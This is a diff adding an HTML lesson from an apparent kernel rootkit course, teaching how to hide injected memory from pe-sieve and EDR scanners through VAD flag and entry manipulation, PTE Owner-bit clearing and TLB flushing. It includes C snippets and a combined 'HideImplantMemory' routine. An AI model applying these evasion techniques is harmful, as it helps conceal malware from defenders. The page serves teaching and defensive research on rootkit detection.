@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 7: Memory Scanner Evasion - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link active" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 7: Memory Scanner Evasion</h1>
+<p class="subtitle">Hiding memory regions from pe-sieve and user-mode scanners via VAD manipulation and PTE tricks.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how memory scanners like pe-sieve discover injected code in process memory, the Virtual Address Descriptor (VAD) tree that Windows uses to track virtual memory regions, how Nidhogg manipulates VAD entries to hide memory allocations, and general PTE-level kernel techniques for advanced memory concealment. Note: PTE manipulation is a general kernel rootkit technique discussed here for educational context; it is not a core feature of the Nidhogg project itself, which primarily focuses on VAD manipulation for memory evasion.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. How Memory Scanners Work</h2>
+
+<p>User-mode memory scanners (pe-sieve, Moneta, malfind in Volatility) detect injected code by examining process memory characteristics. They typically use two approaches:</p>
+
+<table>
+<tr><th>Scan Method</th><th>API Used</th><th>What It Detects</th></tr>
+<tr><td><strong>VAD Enumeration</strong></td><td><code>NtQueryVirtualMemory</code> with <code>MemoryBasicInformation</code></td><td>Lists all committed memory regions, their protections, type (private/mapped/image), and backing</td></tr>
+<tr><td><strong>Region Analysis</strong></td><td><code>ReadProcessMemory</code> / <code>NtReadVirtualMemory</code></td><td>Reads memory content and scans for MZ/PE headers, shellcode patterns, RWX regions</td></tr>
+<tr><td><strong>Module Comparison</strong></td><td><code>NtQueryVirtualMemory</code> + file reads</td><td>Compares in-memory module images against on-disk files to detect hollowing, stomping</td></tr>
+</table>
+
+<div class="card">
+<h4>pe-sieve Detection Logic</h4>
+<p>pe-sieve (by hasherezade) is a widely used scanner that examines each module loaded in a process. It compares the in-memory PE image against the file on disk, detecting modifications like section content changes (hollowing), header modifications, and hook patches. For shellcode, it looks for executable private memory regions that are not backed by any file.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. The Virtual Address Descriptor (VAD) Tree</h2>
+
+<p>The Windows memory manager tracks virtual memory allocations for each process using a self-balancing binary tree of VAD entries. Each VAD describes a range of virtual addresses:</p>
+
+<pre><span class="lang-tag">C</span>// Simplified MMVAD structure (actual structure is complex)
+typedef struct _MMVAD_SHORT {
+    union {
+        RTL_BALANCED_NODE VadNode;      // AVL tree node (parent, left, right)
+        MMVAD_SHORT*      NextVad;
+    };
+    ULONG             StartingVpn;      // Starting virtual page number
+    ULONG             EndingVpn;        // Ending virtual page number
+    // StartingVpn * PAGE_SIZE = region base address
+    // (EndingVpn - StartingVpn + 1) * PAGE_SIZE = region size
+
+    union {
+        ULONG_PTR    Flags;
+        struct {
+            ULONG_PTR VadType     : 3;  // VadNone, VadDevicePhysicalMemory, etc.
+            ULONG_PTR Protection  : 5;  // PAGE_EXECUTE_READWRITE, etc.
+            ULONG_PTR PrivateMemory : 1; // 1 = private, 0 = mapped/image
+            ULONG_PTR MemCommit   : 1;  // Committed or reserved
+            // ... more flag bits
+        };
+    };
+} MMVAD_SHORT, *PMMVAD_SHORT;
+
+// Extended VAD for mapped/image-backed regions
+typedef struct _MMVAD {
+    MMVAD_SHORT     Core;
+    // ...
+    PCONTROL_AREA   ControlArea;    // Points to backing file (if mapped/image)
+    PFILE_OBJECT    FileObject;     // The backing file object
+    // ...
+} MMVAD, *PMMVAD;</pre>
+
+<p>The VAD tree root is stored in the EPROCESS structure. When user-mode code calls <code>NtQueryVirtualMemory</code>, the kernel walks this tree to return information about memory regions.</p>
+
+<!-- ============================================================ -->
+<h2>3. VAD-Based Memory Hiding</h2>
+
+<p>By manipulating VAD entries, Nidhogg can make memory regions invisible to user-mode queries. There are several approaches:</p>
+
+<h3>3.1 VAD Entry Removal</h3>
+
+<pre><span class="lang-tag">C</span>// Remove a VAD entry from the AVL tree
+// This makes the region invisible to NtQueryVirtualMemory
+NTSTATUS HideMemoryRegion(PEPROCESS process, PVOID baseAddress) {
+    // 1. Get the VAD root from EPROCESS
+    PMMVAD_SHORT vadRoot = GetVadRoot(process);
+    if (!vadRoot) return STATUS_NOT_FOUND;
+
+    // 2. Calculate the VPN (Virtual Page Number) for the target address
+    ULONG_PTR targetVpn = (ULONG_PTR)baseAddress >> PAGE_SHIFT;
+
+    // 3. Walk the AVL tree to find the VAD containing this address
+    PMMVAD_SHORT targetVad = FindVadByVpn(vadRoot, targetVpn);
+    if (!targetVad) return STATUS_NOT_FOUND;
+
+    // 4. Remove from the AVL tree
+    // Must properly rebalance the tree after removal
+    PRTL_BALANCED_NODE vadNode = &targetVad->VadNode;
+
+    // Use MiRemoveNode or manually unlink + rebalance
+    // CRITICAL: improper removal corrupts the tree -> BSOD
+    RemoveVadNode(process, vadNode);
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card warn">
+<h4>Danger: Memory Manager Corruption</h4>
+<p>Removing a VAD entry is extremely dangerous. The memory manager uses the VAD tree for page fault handling. If a page fault occurs in a region whose VAD was removed, the kernel cannot find the VAD to resolve the fault and will bugcheck (<code>PAGE_FAULT_IN_NONPAGED_AREA</code> or <code>MEMORY_MANAGEMENT</code>). This technique only works reliably for memory regions that are fully committed, resident, and will not be paged out.</p>
+</div>
+
+<h3>3.2 VAD Flag Manipulation</h3>
+
+<p>A safer approach is to modify the VAD flags rather than removing the entry entirely:</p>
+
+<pre><span class="lang-tag">C</span>// Change VAD flags to make the region look benign
+NTSTATUS DisguiseMemoryRegion(PEPROCESS process, PVOID baseAddress) {
+    PMMVAD_SHORT targetVad = FindVadForAddress(process, baseAddress);
+    if (!targetVad) return STATUS_NOT_FOUND;
+
+    // Option 1: Change protection from PAGE_EXECUTE_READWRITE to PAGE_READWRITE
+    // This removes the executable flag, making it look like data memory
+    // pe-sieve skips non-executable regions
+    targetVad->Protection = MM_READWRITE;  // Was MM_EXECUTE_READWRITE
+
+    // Option 2: Mark as image-backed instead of private
+    // This makes it look like a legitimate loaded module
+    targetVad->PrivateMemory = 0;
+
+    return STATUS_SUCCESS;
+}</pre>
+
+<div class="card green">
+<h4>Why Flag Manipulation Is Safer</h4>
+<p>Modifying flags leaves the VAD tree structure intact, so page fault handling continues to work. The risk is that changing the protection flags in the VAD may not match the actual PTE protections, creating an inconsistency that advanced forensics tools can detect. However, most user-mode scanners rely solely on <code>NtQueryVirtualMemory</code> output and do not cross-check against PTEs.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Page Table Entry (PTE) Manipulation</h2>
+
+<div class="card warn">
+<h4>Attribution Note</h4>
+<p>PTE manipulation is a <strong>general kernel rootkit technique</strong>, not a feature specific to Nidhogg's codebase. Nidhogg's actual memory evasion capabilities center on VAD manipulation (sections 2-3 above). The PTE techniques described below are included for educational completeness as they represent the broader landscape of kernel memory evasion, but they should not be attributed to Nidhogg specifically. Nidhogg's documented feature set includes: process hiding/elevating/protecting, file hiding/protecting, registry hiding/protecting, driver signature enforcement bypass, callback removal, and ETW patching.</p>
+</div>
+
+<p>For deeper memory concealment, a kernel rootkit can manipulate Page Table Entries directly. PTEs are the hardware-level structures that the CPU uses for virtual-to-physical address translation:</p>
+
+<pre><span class="lang-tag">C</span>// x64 PTE structure (hardware format)
+typedef struct _HARDWARE_PTE {
+    ULONG64 Valid         : 1;   // Page is present in physical memory
+    ULONG64 Write         : 1;   // Page is writable
+    ULONG64 Owner         : 1;   // 0 = kernel, 1 = user accessible
+    ULONG64 WriteThrough  : 1;   // Cache write-through
+    ULONG64 CacheDisable  : 1;   // Disable caching
+    ULONG64 Accessed      : 1;   // Page has been accessed
+    ULONG64 Dirty         : 1;   // Page has been written
+    ULONG64 LargePage     : 1;   // 2MB page (in PDE)
+    ULONG64 Global        : 1;   // Global page (not flushed on CR3 switch)
+    ULONG64 CopyOnWrite   : 1;   // Software: COW
+    ULONG64 Prototype     : 1;   // Software: prototype PTE
+    ULONG64 Reserved      : 1;
+    ULONG64 PageFrameNumber : 36; // Physical page frame number
+    ULONG64 Reserved2     : 4;
+    ULONG64 SoftwareWsIndex : 11;
+    ULONG64 NoExecute     : 1;   // NX bit: page is not executable
+} HARDWARE_PTE, *PHARDWARE_PTE;</pre>
+
+<!-- ============================================================ -->
+<h2>5. PTE-Based Hiding Techniques</h2>
+
+<p>Several PTE manipulation techniques can hide memory from scanners:</p>
+
+<table>
+<tr><th>Technique</th><th>How It Works</th><th>Effect</th></tr>
+<tr><td><strong>Clear Valid Bit</strong></td><td>Set PTE.Valid = 0, save original PTE</td><td>CPU cannot access the page; reads trigger page fault. Scanner sees non-present pages. Restore before code needs to execute.</td></tr>
+<tr><td><strong>Set NX Bit</strong></td><td>Set PTE.NoExecute = 1</td><td>Page appears non-executable to hardware. Scanner sees RW instead of RWX. Code execution causes #PF exception.</td></tr>
+<tr><td><strong>Clear Owner Bit</strong></td><td>Set PTE.Owner = 0 (kernel only)</td><td>Page becomes kernel-only. User-mode ReadProcessMemory cannot access it. Scanner gets STATUS_PARTIAL_COPY.</td></tr>
+<tr><td><strong>Remap Physical Page</strong></td><td>Change PTE.PageFrameNumber to point to a different physical page</td><td>Scanner reads decoy data while code still executes from the real page when PTEs are swapped back</td></tr>
+</table>
+
+<pre><span class="lang-tag">C</span>// Technique: Clear the User/Supervisor bit to hide from user-mode reads
+NTSTATUS HidePageFromUserMode(PVOID virtualAddress) {
+    // 1. Resolve the PTE for this virtual address
+    // PTE address calculation for x64:
+    // PTE_BASE + (VA >> 12) * 8
+    PHARDWARE_PTE pte = MiGetPteAddress(virtualAddress);
+
+    // 2. Save original PTE value
+    HARDWARE_PTE originalPte = *pte;
+
+    // 3. Clear the Owner bit (make kernel-only)
+    pte->Owner = 0;  // 0 = supervisor (ring 0) only
+
+    // 4. Flush the TLB for this page
+    // The CPU caches PTE translations; must invalidate
+    __invlpg(virtualAddress);
+
+    // Result: User-mode ReadProcessMemory returns STATUS_PARTIAL_COPY
+    // Kernel-mode code can still access the page normally
+    return STATUS_SUCCESS;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>6. MiGetPteAddress: Resolving PTEs</h2>
+
+<p>Finding the PTE for a given virtual address requires navigating the 4-level page table hierarchy:</p>
+
+<pre><span class="lang-tag">C</span>// x64 Page Table Hierarchy
+// PML4E -> PDPTE -> PDE -> PTE -> Physical Page
+
+// Windows maintains a recursive page table mapping at a known base
+// The PTE base address varies by Windows version
+
+PHARDWARE_PTE MiGetPteAddress(PVOID virtualAddress) {
+    // Method 1: Use the exported MmGetVirtualForPhysical approach
+    // or pattern-scan for MiGetPteAddress in ntoskrnl
+
+    // Method 2: Calculate from the PTE base
+    // PTE_BASE is stored in MmPteBase (internal variable)
+    // PTE address = PTE_BASE + ((VA >> 12) << 3)
+    ULONG_PTR va = (ULONG_PTR)virtualAddress;
+    ULONG_PTR pteAddr = g_PteBase + ((va >> 12) << 3);
+    return (PHARDWARE_PTE)pteAddr;
+}
+
+// Finding PTE base: scan ntoskrnl for MiGetPteAddress
+ULONG_PTR FindPteBase() {
+    // MiGetPteAddress has a characteristic pattern:
+    // MOV RAX, VA          (48 C7 C0 ...)
+    // SHR RAX, 9           (48 C1 E8 09)
+    // MOV RCX, PTE_BASE    (48 B9 xx xx xx xx xx xx xx xx)
+    // ... pattern scan ntoskrnl .text section
+    return g_PteBase;
+}</pre>
+
+<div class="card">
+<h4>PTE Base Randomization</h4>
+<p>Starting with Windows 10 Anniversary Update, the PTE base address is randomized at boot (KASLR for page tables). The base is different on each boot, so Nidhogg must resolve it dynamically, typically by scanning ntoskrnl for a function that loads the base address, or by reading <code>MmPteBase</code> if the symbol can be resolved.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Combining VAD and PTE Techniques</h2>
+
+<p>The most effective memory hiding combines multiple layers:</p>
+
+<div class="card green">
+<h4>Layered Memory Concealment</h4>
+<ol>
+<li><strong>VAD Flags</strong>: Change Protection to non-executable and PrivateMemory to 0 &mdash; defeats basic <code>NtQueryVirtualMemory</code> checks</li>
+<li><strong>PTE Owner Bit</strong>: Set pages to supervisor-only &mdash; defeats <code>ReadProcessMemory</code> from user-mode scanners</li>
+<li><strong>Process Protection</strong>: Use <code>ObRegisterCallbacks</code> to strip <code>PROCESS_VM_READ</code> from scanner handles &mdash; prevents scanners from even opening the process</li>
+<li><strong>ETW Blinding</strong>: Disable Threat Intelligence provider &mdash; prevents kernel-level telemetry about the memory allocation</li>
+</ol>
+</div>
+
+<pre><span class="lang-tag">C</span>// Full-stack memory hiding for an implant
+NTSTATUS HideImplantMemory(ULONG pid, PVOID baseAddress, SIZE_T regionSize) {
+    NTSTATUS status;
+    PEPROCESS targetProcess;
+
+    PsLookupProcessByProcessId((HANDLE)(ULONG_PTR)pid, &targetProcess);
+
+    // Layer 1: Modify VAD flags
+    status = DisguiseVadFlags(targetProcess, baseAddress);
+
+    // Layer 2: Set PTE Owner bit to kernel-only for each page
+    KAPC_STATE apcState;
+    KeStackAttachProcess(targetProcess, &apcState);
+    for (SIZE_T offset = 0; offset < regionSize; offset += PAGE_SIZE) {
+        PVOID pageAddr = (PUCHAR)baseAddress + offset;
+        PHARDWARE_PTE pte = MiGetPteAddress(pageAddr);
+        if (pte && pte->Valid) {
+            pte->Owner = 0;  // Supervisor only
+            __invlpg(pageAddr);
+        }
+    }
+    KeUnstackDetachProcess(&apcState);
+
+    // Layer 3: Process protection via ObRegisterCallbacks (already set up)
+    // Layer 4: ETW already disabled via Module 5 techniques
+
+    ObDereferenceObject(targetProcess);
+    return STATUS_SUCCESS;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>8. Defeating Kernel-Mode Scanners</h2>
+
+<p>User-mode scanners can be defeated with VAD and PTE tricks, but kernel-mode scanners (EDR drivers that read process memory directly) are harder to evade:</p>
+
+<table>
+<tr><th>Scanner Type</th><th>Defeated By VAD Manipulation?</th><th>Defeated By PTE Owner Bit?</th><th>What Else Is Needed?</th></tr>
+<tr><td>User-mode (pe-sieve)</td><td>Yes &mdash; relies on NtQueryVirtualMemory</td><td>Yes &mdash; uses ReadProcessMemory</td><td>Nothing; both layers are sufficient</td></tr>
+<tr><td>Kernel-mode (EDR driver)</td><td>Partially &mdash; may use direct VAD walk</td><td>No &mdash; kernel driver runs in supervisor mode</td><td>Must also manipulate kernel-mode read paths or encrypt memory</td></tr>
+<tr><td>Hypervisor-based</td><td>No</td><td>No</td><td>Second-level page table (EPT) manipulation needed, which Nidhogg does not implement</td></tr>
+</table>
+
+<div class="card warn">
+<h4>Limitations</h4>
+<p>Nidhogg's memory hiding is primarily effective against user-mode scanners and tools. Kernel-mode forensics (e.g., an EDR driver that directly walks page tables or uses <code>MmCopyVirtualMemory</code>) can still access hidden pages because kernel code runs in supervisor mode. Full evasion of kernel-mode scanners would require EPT manipulation (hypervisor-level), which is beyond Nidhogg's scope.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>9. TLB Considerations</h2>
+
+<p>When modifying PTEs, the Translation Lookaside Buffer (TLB) must be properly managed:</p>
+
+<pre><span class="lang-tag">C</span>// After modifying a PTE, the CPU's TLB may still cache the old translation
+// Must invalidate the TLB entry for the affected virtual address
+
+// Single page invalidation (preferred)
+__invlpg(virtualAddress);
+
+// If modifying PTEs for a different process (different CR3):
+// Must flush TLB on all processors that might have cached the translation
+// Use KeIpiGenericCall or KeFlushEntireTb for cross-processor flush
+
+VOID FlushTlbForAddress(PVOID address) {
+    // This runs on the current processor
+    __invlpg(address);
+
+    // For multi-processor systems, also flush remote TLBs
+    // The kernel's MiFlushTb or KeFlushSingleTb handles this
+    // Or use an IPI (Inter-Processor Interrupt):
+    KeIpiGenericCall(FlushTlbOnAllProcessors, (ULONG_PTR)address);
+}</pre>
+
+<div class="card">
+<h4>Stale TLB Entries</h4>
+<p>Forgetting to invalidate the TLB after PTE modification is a common bug. The CPU will continue using the cached (old) translation until the TLB entry is flushed. This can cause the page to remain accessible despite the PTE change, or cause unexpected access violations if the page is made non-present. On multi-processor systems, each core has its own TLB, so the flush must be broadcast.</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="C">
+<p>Q1: Why is removing a VAD entry dangerous compared to modifying VAD flags?</p>
+<div class="quiz-btn" data-choice="A">A) Removing a VAD entry is slower</div>
+<div class="quiz-btn" data-choice="B">B) Removing a VAD entry triggers PatchGuard</div>
+<div class="quiz-btn" data-choice="C">C) The memory manager needs the VAD for page fault handling; removing it causes a bugcheck if the page faults</div>
+<div class="quiz-btn" data-choice="D">D) VAD entries cannot be removed once created</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: How does clearing the PTE Owner bit hide memory from user-mode scanners?</p>
+<div class="quiz-btn" data-choice="A">A) It makes the page supervisor-only (ring 0), so user-mode ReadProcessMemory returns STATUS_PARTIAL_COPY when trying to read it</div>
+<div class="quiz-btn" data-choice="B">B) It encrypts the page contents</div>
+<div class="quiz-btn" data-choice="C">C) It removes the page from virtual memory</div>
+<div class="quiz-btn" data-choice="D">D) It marks the page as non-executable</div>
+</div>
+
+<div class="quiz-q" data-answer="B">
+<p>Q3: Why must __invlpg be called after modifying a PTE?</p>
+<div class="quiz-btn" data-choice="A">A) It commits the PTE change to disk</div>
+<div class="quiz-btn" data-choice="B">B) The CPU TLB caches address translations; without flushing, the old PTE value may still be used for address resolution</div>
+<div class="quiz-btn" data-choice="C">C) It notifies PatchGuard about the legitimate modification</div>
+<div class="quiz-btn" data-choice="D">D) It is required by the Windows memory manager API</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module6.html">&larr; Previous: Kernel Callbacks &amp; Notification Routines</a>
+<a class="primary" href="module8.html">Next: Full Chain, IOCTL Interface &amp; Detection &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
